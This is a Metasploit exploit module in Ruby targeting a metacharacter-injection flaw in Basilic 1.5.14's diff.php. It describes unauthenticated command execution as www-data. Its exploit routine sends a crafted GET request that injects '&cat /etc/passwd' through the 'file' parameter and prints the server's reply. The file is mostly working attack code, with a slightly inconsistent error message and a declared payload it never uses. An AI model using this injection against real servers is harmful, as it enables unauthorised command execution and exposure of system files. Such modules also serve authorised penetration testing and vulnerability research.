##
# $Id: basilic.rb 15546 2012-06-28 19:34:06Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Basilic 1.5.14 diff.php Arbitrary Command Execution',
			'Description'    => %q{
					This module abuses a metacharacter injection vulnerability in the
				diff.php script. This flaw allows an unauthenticated attacker to execute arbitrary commands as
				the www-data user account.
			},
			'Author'         => [ 'lcashdollar' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 15562 $',
			'References'     =>
				[
					[ 'BID', '54234' ]
				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'       => 1024,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd'
						}
				},
			'Targets'        =>
				[
					[ 'Automatic Target', { }]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 28 2012'
			))
	end

	def exploit

		# TODO: force use of echo-ne CMD encoder

		print_status("Sending GET request with encoded command line..")
		res = send_request_raw({ 'uri' => "/basilic-1.5.14/Config/diff.php?file=%26cat%20/etc/passwd&new=1&old=2" })
		if res.code == 404 then
			print_error("404 Authorization Required! Our BasicAuthUser and BasicAuthPass credentials not accepted!")
		else
                        print_line(res.body);

		end
	end
end
